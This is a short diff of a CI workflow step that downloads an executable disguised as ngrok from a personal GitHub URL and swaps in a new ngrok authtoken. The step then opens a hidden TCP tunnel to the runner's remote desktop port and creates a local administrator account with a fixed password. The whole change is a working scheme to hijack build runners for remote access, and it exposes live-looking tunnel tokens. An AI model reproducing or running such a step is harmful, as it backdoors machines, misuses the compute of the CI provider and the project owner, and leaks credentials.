@@ -12,7 +12,7 @@ jobs:
     - name: rrt
       run: |
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/use.exe" -OutFile ngrok.exe 
-           cmd /c ngrok.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
+           cmd /c ngrok.exe authtoken 2CMy5dw3Nisup8JGIZuHvSwoEdr_77vLBUh2x4oHQC4TRm4CZ
            Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
            cmd /c net user /add Admin P@ssw0rd.
            cmd /c net localgroup /add administrators Admin
